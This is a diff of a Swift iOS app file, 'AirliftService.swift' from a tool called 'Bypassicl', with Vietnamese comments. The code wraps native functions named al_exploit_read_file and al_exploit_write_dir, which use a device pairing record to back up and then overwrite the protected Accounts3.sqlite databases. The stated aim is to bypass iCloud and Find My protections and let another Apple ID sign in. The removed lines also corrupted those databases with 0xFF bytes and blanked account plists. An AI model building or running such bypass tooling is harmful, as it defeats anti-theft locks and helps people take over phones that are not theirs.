@@ -1,5 +1,5 @@
 // ============================================================
-// AirliftService.swift — Bypassicl (Final Version)
+// AirliftService.swift — Bypassicl (Clean Bypass & Full Restore)
 // ============================================================
 
 import Foundation
@@ -24,7 +24,7 @@ class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
     @Published var isProcessing = false
     @Published var showAlert = false
     @Published var alertMessage = ""
-    @Published var isVPNConnected = false 
+    @Published var isVPNConnected = false
     
     private var netService: NetService?
     private var audioPlayer: AVAudioPlayer?
@@ -36,20 +36,24 @@ class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
     private let localNetwork = LocalNetworkAuthorization()
     
     private let accountsDir = "/var/mobile/Library/Accounts"
-    private let prefsDir = "/var/mobile/Library/Preferences"
-    
     private let targetFiles = ["Accounts3.sqlite", "Accounts3.sqlite-shm", "Accounts3.sqlite-wal"]
-    private let plistFiles = ["com.apple.accountsd.plist", "com.apple.mobilemeaccounts.plist", "com.apple.accounts.plist", "com.apple.appleaccount.plist"]
     
     var backupDir: URL {
-        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0].appendingPathComponent("AccountsBackup")
+        FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
+            .appendingPathComponent("AccountsBackup")
     }
+    
     private var documentsDir: URL {
         FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]
     }
+    
     var hasCompleteBackup: Bool {
         let fm = FileManager.default
-        return targetFiles.allSatisfy { fm.fileExists(atPath: backupDir.appendingPathComponent($0).path) }
+        return targetFiles.allSatisfy { file in
+            let url = backupDir.appendingPathComponent(file)
+            var isDir: ObjCBool = false
+            return fm.fileExists(atPath: url.path, isDirectory: &isDir) && !isDir.boolValue
+        }
     }
     
     override init() {
@@ -64,13 +68,21 @@ class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
         print(message)
     }
     
+    private func presentAlert(_ message: String) {
+        self.alertMessage = message
+        self.showAlert = true
+    }
+    
     // ============================================================
     // QUÉT VPN LOCALDEV REALTIME
     // ============================================================
     private func startVPNMonitor() {
         checkVPNNow()
         vpnTimer = Timer.scheduledTimer(withTimeInterval: 1.0, repeats: true) { [weak self] _ in
-            self?.checkVPNNow()
+            guard let self = self else { return }
+            Task { @MainActor in
+                self.checkVPNNow()
+            }
         }
         RunLoop.main.add(vpnTimer!, forMode: .common)
     }
@@ -109,7 +121,7 @@ class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
         let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
         if let rawString = String(validatingUTF8: msg) {
             let cleanString = rawString.replacingOccurrences(of: "\u{001B}\\[[0-9;]*[a-zA-Z]", with: "", options: .regularExpression)
-            DispatchQueue.main.async { service.log("[Airlift] \(cleanString)") }
+            Task { @MainActor in service.log("[Airlift] \(cleanString)") }
         }
     }
     
@@ -117,9 +129,8 @@ class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
         guard let ctx = ctx, let pin = pin else { return }
         let service = Unmanaged<AirliftService>.fromOpaque(ctx).takeUnretainedValue()
         let pinStr = String(cString: pin)
-        DispatchQueue.main.async {
+        Task { @MainActor in
             service.currentPin = pinStr
-            service.log("🔐 PIN READY: \(pinStr)")
             service.presentPin(pinStr)
         }
     }
@@ -135,7 +146,7 @@ class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
                 txt[String(cString: k)] = Data(String(cString: v).utf8)
             }
         }
-        DispatchQueue.main.async { service.startAdvertising(serviceID: id, port: Int32(port), txt: txt) }
+        Task { @MainActor in service.startAdvertising(serviceID: id, port: Int32(port), txt: txt) }
     }
     
     nonisolated private func registerBackgroundTask() {
@@ -268,11 +279,10 @@ class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
                     self.pairingFilePath = finalPath
                     self.lastDeviceName = finalName
                     self.log("✅ Pairing successful!")
-                    self.alertMessage = "Pairing Thành Công!"
+                    self.presentAlert("Pairing Thành Công!")
                 } else {
                     self.log("⏹ Pairing cancelled.")
                 }
-                self.showAlert = true
                 self.finishTask(success: isSuccess)
             }
         }
@@ -335,29 +345,47 @@ class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
         let accessing = url.startAccessingSecurityScopedResource()
         defer { if accessing { url.stopAccessingSecurityScopedResource() } }
         do {
-            try FileManager.default.createDirectory(at: documentsDir, withIntermediateDirectories: true)
+            let fm = FileManager.default
+            try fm.createDirectory(at: documentsDir, withIntermediateDirectories: true)
             let dest = documentsDir.appendingPathComponent("pairingRecord.mobiledevicepairing")
-            try Data(contentsOf: url).write(to: dest, options: .atomic)
+            
+            var data: Data? = try? Data(contentsOf: url)
+            if data == nil {
+                var coordError: NSError?
+                NSFileCoordinator().coordinate(readingItemAt: url, options: .withoutChanges, error: &coordError) { readURL in
+                    data = try? Data(contentsOf: readURL)
+                }
+            }
+            
+            guard let fileData = data, !fileData.isEmpty else {
+                self.log("❌ Import failed: không đọc được dữ liệu file.")
+                self.presentAlert("Không đọc được file pairing đã chọn.")
+                return
+            }
+            
+            if fm.fileExists(atPath: dest.path) {
+                try fm.removeItem(at: dest)
+            }
+            try fileData.write(to: dest, options: .atomic)
             self.pairingFilePath = dest.path
-            self.log("✅ Pairing file imported")
-            self.alertMessage = "Import Pairing File Thành Công!"
-            self.showAlert = true
-        } catch { log("❌ Import failed: \(error.localizedDescription)") }
+            self.log("✅ Pairing file imported (\(fileData.count) bytes)")
+            self.presentAlert("Import Pairing File Thành Công!")
+        } catch {
+            self.log("❌ Import failed: \(error.localizedDescription)")
+            self.presentAlert("Import lỗi: \(error.localizedDescription)")
+        }
     }
 
-    // Hàm xoá file pairing
     func deletePairingFile() {
         guard let path = pairingFilePath else { return }
         do {
             try FileManager.default.removeItem(atPath: path)
             self.pairingFilePath = nil
             self.log("🗑 Đã xoá Pairing File.")
-            self.alertMessage = "Đã xoá Pairing File thành công!"
-            self.showAlert = true
+            self.presentAlert("Đã xoá Pairing File thành công!")
         } catch {
             self.log("❌ Lỗi xoá file: \(error.localizedDescription)")
-            self.alertMessage = "Lỗi xoá file: \(error.localizedDescription)"
-            self.showAlert = true
+            self.presentAlert("Lỗi xoá file: \(error.localizedDescription)")
         }
     }
 
@@ -368,8 +396,7 @@ class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
         var outData: UnsafeMutablePointer<UInt8>? = nil
         var outLen: size_t = 0
         var outError: UnsafeMutablePointer<CChar>? = nil
-        let ctx = Unmanaged.passUnretained(self).toOpaque()
-        let result = al_exploit_read_file(pairingPath, iosPath, AirliftService.logCallback, ctx, &outData, &outLen, &outError)
+        let result = al_exploit_read_file(pairingPath, iosPath, nil, nil, &outData, &outLen, &outError)
         defer {
             if let e = outError { al_string_free(e) }
             if let d = outData { al_bytes_free(d, outLen) }
@@ -383,142 +410,194 @@ class AirliftService: NSObject, ObservableObject, NetServiceDelegate {
 
     nonisolated private func ffi_write_dir_internal(pairingPath: String, sourceDir: String, targetDir: String) -> Bool {
         var outError: UnsafeMutablePointer<CChar>? = nil
-        let ctx = Unmanaged.passUnretained(self).toOpaque()
-        let result = al_exploit_write_dir(pairingPath, sourceDir, targetDir, AirliftService.logCallback, ctx, &outError)
+        let result = al_exploit_write_dir(pairingPath, sourceDir, targetDir, nil, nil, &outError)
         defer { if let e = outError { al_string_free(e) } }
         return result == 0
     }
 
+    // Tạo file SQLite header hợp lệ (không có bản ghi tài khoản cũ) để tránh crash daemon
+    nonisolated private func makeCleanSQLiteData() -> Data {
+        var db = Data(count: 4096)
+        let header: [UInt8] = [
+            0x53, 0x51, 0x4C, 0x69, 0x74, 0x65, 0x20, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x20, 0x33, 0x00,
+            0x10, 0x00, 0x01, 0x01, 0x00, 0x40, 0x20, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
+            0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x7A, 0x00
+        ]
+        db.replaceSubrange(0..<header.count, with: header)
+        return db
+    }
+
     // ============================================================
-    // BYPASS: LOGIN ACC KHÁC + CHẶN FMI, LOCK MÁY
+    // BYPASS LÀNH: TỰ BACKUP 3 FILE SQLITE -> LÀM SẠCH ĐỂ ĐĂNG NHẬP ACC KHÁC
     // ============================================================
     func bypassICloud() {
         guard !isProcessing else { return }
         guard connect(), let pairingPath = pairingFilePath else {
             log("❌ Bypass failed: Missing Pairing File.")
+            presentAlert("Chưa có Pairing File.")
             return
         }
         
         isProcessing = true
-        log("[*] Bắt đầu Bypass (Xóa Acc, Chặn FMI)...")
+        log("[*] Bắt đầu Bypass lành (Backup 3 sqlite & làm sạch tài khoản cũ)...")
+        
+        let backupURL = self.backupDir
+        let alreadyBackedUp = self.hasCompleteBackup
+        let files = self.targetFiles
+        let remoteAccountsDir = self.accountsDir
         
         DispatchQueue.global(qos: .userInitiated).async { [weak self] in
             guard let self = self else { return }
             let fm = FileManager.default
             
-            // 1. Backup file gốc trước khi phá
-            try? fm.createDirectory(at: self.backupDir, withIntermediateDirectories: true)
-            if !self.hasCompleteBackup {
-                DispatchQueue.main.async { self.log("[*] Đang backup file gốc...") }
-                for file in self.targetFiles {
-                    let path = "\(self.accountsDir)/\(file)"
-                    if let data = self.ffi_read_file_internal(pairingPath: pairingPath, iosPath: path) {
-                        try? data.write(to: self.backupDir.appendingPathComponent(file), options: .atomic)
+            // 1. Tự động backup đủ 3 file sqlite lần đầu vào AccountsBackup
+            if !alreadyBackedUp {
+                do {
+                    try fm.createDirectory(at: backupURL, withIntermediateDirectories: true)
+                } catch {
+                    DispatchQueue.main.async {
+                        self.log("❌ Không tạo được thư mục backup: \(error.localizedDescription)")
+                        self.presentAlert("Không tạo được thư mục AccountsBackup.")
+                        self.isProcessing = false
+                    }
+                    return
+                }
+                
+                DispatchQueue.main.async { self.log("[*] Đang backup 3 file sqlite gốc...") }
+                for file in files {
+                    let remotePath = "\(remoteAccountsDir)/\(file)"
+                    guard let data = self.ffi_read_file_internal(pairingPath: pairingPath, iosPath: remotePath) else {
+                        DispatchQueue.main.async {
+                            self.log("❌ Backup thất bại tại \(file), hủy Bypass để giữ nguyên bản gốc.")
+                            self.presentAlert("Backup thất bại tại \(file).")
+                            self.isProcessing = false
+                        }
+                        return
+                    }
+                    do {
+                        try data.write(to: backupURL.appendingPathComponent(file), options: .atomic)
+                        DispatchQueue.main.async { self.log("✅ Backup \(file) (\(data.count) bytes)") }
+                    } catch {
+                        DispatchQueue.main.async {
+                            self.log("❌ Ghi file backup \(file) lỗi: \(error.localizedDescription)")
+                            self.presentAlert("Lỗi lưu file backup \(file).")
+                            self.isProcessing = false
+                        }
+                        return
                     }
                 }
+            } else {
+                DispatchQueue.main.async { self.log("ℹ️ Đã có đủ 3 file trong AccountsBackup, giữ nguyên bản gốc.") }
             }
             
-            // 2. Phá DB (0xFF)
-            let garbageDir = fm.temporaryDirectory.appendingPathComponent("garbage_\(UUID().uuidString)")
-            try? fm.createDirectory(at: garbageDir, withIntermediateDirectories: true)
-            let garbageData = Data(repeating: 0xFF, count: 1024 * 1024)
-            for file in self.targetFiles {
-                try? garbageData.write(to: garbageDir.appendingPathComponent(file), options: .atomic)
+            // 2. Tạo bộ file sạch (header SQLite hợp lệ + shm/wal rỗng) để không crash daemon
+            let cleanDir = fm.temporaryDirectory.appendingPathComponent("clean_accounts_\(UUID().uuidString)")
+            do {
+                try fm.createDirectory(at: cleanDir, withIntermediateDirectories: true)
+                try self.makeCleanSQLiteData().write(to: cleanDir.appendingPathComponent("Accounts3.sqlite"), options: .atomic)
+                try Data().write(to: cleanDir.appendingPathComponent("Accounts3.sqlite-shm"), options: .atomic)
+                try Data().write(to: cleanDir.appendingPathComponent("Accounts3.sqlite-wal"), options: .atomic)
+            } catch {
+                try? fm.removeItem(at: cleanDir)
+                DispatchQueue.main.async {
+                    self.log("❌ Lỗi tạo bộ file sạch: \(error.localizedDescription)")
+                    self.presentAlert("Lỗi tạo bộ file sạch.")
+                    self.isProcessing = false
+                }
+                return
             }
             
-            let success = self.ffi_write_dir_internal(pairingPath: pairingPath, sourceDir: garbageDir.path, targetDir: self.accountsDir)
-            
-            // 3. Xóa plist
-            let plistEmptyDir = fm.temporaryDirectory.appendingPathComponent("plist_\(UUID().uuidString)")
-            try? fm.createDirectory(at: plistEmptyDir, withIntermediateDirectories: true)
-            let emptyData = Data()
-            for file in self.plistFiles {
-                try? emptyData.write(to: plistEmptyDir.appendingPathComponent(file), options: .atomic)
-            }
-            _ = self.ffi_write_dir_internal(pairingPath: pairingPath, sourceDir: plistEmptyDir.path, targetDir: self.prefsDir)
+            let ok = self.ffi_write_dir_internal(
+                pairingPath: pairingPath,
+                sourceDir: cleanDir.path,
+                targetDir: remoteAccountsDir
+            )
+            try? fm.removeItem(at: cleanDir)
             
             Thread.sleep(forTimeInterval: 0.5)
             
             DispatchQueue.main.async {
-                if success {
-                    self.log("🎉 BYPASS THÀNH CÔNG! Hãy vuốt tắt app Cài đặt (Settings) và mở lại.")
-                    self.alertMessage = "Bypass Thành Công! Đã xóa acc cũ, chặn FMI. Vui lòng tắt app Cài đặt và mở lại."
+                if ok {
+                    self.log("🎉 BYPASS LÀNH HOÀN TẤT! Thoát hẳn app Cài đặt rồi mở lại để kiểm tra & đăng nhập Apple ID khác.")
+                    self.presentAlert("Bypass Hoàn Tất! Hãy tắt hẳn Cài đặt và mở lại.")
                 } else {
-                    self.log("❌ Bypass thất bại.")
-                    self.alertMessage = "Bypass thất bại."
+                    self.log("❌ Bypass thất bại khi ghi vào \(remoteAccountsDir).")
+                    self.presentAlert("Bypass thất bại. Kiểm tra log.")
                 }
                 self.isProcessing = false
-                self.showAlert = true
             }
-            
-            try? fm.removeItem(at: garbageDir)
-            try? fm.removeItem(at: plistEmptyDir)
         }
     }
 
     // ============================================================
-    // RESTORE: ĐƯA MÁY VỀ TRẠNG THÁI SẠCH NHẤT
+    // RESTORE: LẤY 3 FILE SQLITE TỪ ACCOUNTSBACKUP GHI TRẢ LẠI ACCOUNTS
     // ============================================================
     func restoreOriginalAccounts() {
         guard !isProcessing else { return }
         guard connect(), let pairingPath = pairingFilePath else {
             log("❌ Restore failed: Missing Pairing File.")
+            presentAlert("Chưa có Pairing File.")
+            return
+        }
+        guard hasCompleteBackup else {
+            log("❌ Restore failed: Chưa có đủ 3 file backup trong AccountsBackup.")
+            presentAlert("Không tìm thấy đủ 3 file backup trong AccountsBackup.")
             return
         }
         
         isProcessing = true
-        log("[*] Bắt đầu Restore (Đưa máy về trạng thái sạch)...")
+        log("[*] Bắt đầu Restore nguyên vẹn 3 file sqlite từ AccountsBackup...")
+        
+        let backupURL = self.backupDir
+        let files = self.targetFiles
+        let remoteAccountsDir = self.accountsDir
         
         DispatchQueue.global(qos: .userInitiated).async { [weak self] in
             guard let self = self else { return }
             let fm = FileManager.default
+            let restoreDir = fm.temporaryDirectory.appendingPathComponent("restore_\(UUID().uuidString)")
             
-            var emptyDB = Data(count: 4096)
-            let header: [UInt8] = [
-                0x53, 0x51, 0x4C, 0x69, 0x74, 0x65, 0x20, 0x66, 0x6F, 0x72, 0x6D, 0x61, 0x74, 0x20, 0x33, 0x00,
-                0x10, 0x00, 0x01, 0x01, 0x00, 0x40, 0x20, 0x20, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x00,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                0x00, 0x00, 0x00, 0x00, 0x00, 0x2E, 0x7A, 0x00
-            ]
-            emptyDB.replaceSubrange(0..<100, with: header)
-            
-            let emptyData = Data()
-            
-            let cleanDir = fm.temporaryDirectory.appendingPathComponent("clean_\(UUID().uuidString)")
-            try? fm.createDirectory(at: cleanDir, withIntermediateDirectories: true)
-            
-            try? emptyDB.write(to: cleanDir.appendingPathComponent("Accounts3.sqlite"), options: .atomic)
-            try? emptyData.write(to: cleanDir.appendingPathComponent("Accounts3.sqlite-wal"), options: .atomic)
-            try? emptyData.write(to: cleanDir.appendingPathComponent("Accounts3.sqlite-shm"), options: .atomic)
-            
-            let success = self.ffi_write_dir_internal(pairingPath: pairingPath, sourceDir: cleanDir.path, targetDir: self.accountsDir)
-            
-            let plistEmptyDir = fm.temporaryDirectory.appendingPathComponent("plist_\(UUID().uuidString)")
-            try? fm.createDirectory(at: plistEmptyDir, withIntermediateDirectories: true)
-            for file in self.plistFiles {
-                try? emptyData.write(to: plistEmptyDir.appendingPathComponent(file), options: .atomic)
+            do {
+                try fm.createDirectory(at: restoreDir, withIntermediateDirectories: true)
+                for file in files {
+                    let srcURL = backupURL.appendingPathComponent(file)
+                    let data = try Data(contentsOf: srcURL)
+                    try data.write(to: restoreDir.appendingPathComponent(file), options: .atomic)
+                    DispatchQueue.main.async { self.log("📦 Nạp \(file) (\(data.count) bytes)") }
+                }
+            } catch {
+                try? fm.removeItem(at: restoreDir)
+                DispatchQueue.main.async {
+                    self.log("❌ Lỗi đọc file backup: \(error.localizedDescription)")
+                    self.presentAlert("Lỗi đọc file backup để Restore.")
+                    self.isProcessing = false
+                }
+                return
             }
-            _ = self.ffi_write_dir_internal(pairingPath: pairingPath, sourceDir: plistEmptyDir.path, targetDir: self.prefsDir)
+            
+            let ok = self.ffi_write_dir_internal(
+                pairingPath: pairingPath,
+                sourceDir: restoreDir.path,
+                targetDir: remoteAccountsDir
+            )
+            try? fm.removeItem(at: restoreDir)
             
             Thread.sleep(forTimeInterval: 0.5)
             
             DispatchQueue.main.async {
-                if success {
-                    self.log("✅ RESTORE HOÀN TẤT! Máy đã về trạng thái sạch nhất.")
-                    self.alertMessage = "Restore Thành Công! Máy đã sạch. Vui lòng tắt app Cài đặt và mở lại."
+                if ok {
+                    self.log("✅ RESTORE HOÀN TẤT! Đã trả lại nguyên vẹn 3 file sqlite. Tắt hẳn Cài đặt và mở lại.")
+                    self.presentAlert("Restore Thành Công! Tài khoản gốc đã được khôi phục.")
                 } else {
-                    self.log("❌ Restore thất bại.")
-                    self.alertMessage = "Restore thất bại."
+                    self.log("❌ Restore thất bại khi ghi về \(remoteAccountsDir).")
+                    self.presentAlert("Restore thất bại. Kiểm tra log.")
                 }
                 self.isProcessing = false
-                self.showAlert = true
             }
-            
-            try? fm.removeItem(at: cleanDir)
-            try? fm.removeItem(at: plistEmptyDir)
         }
     }
 }
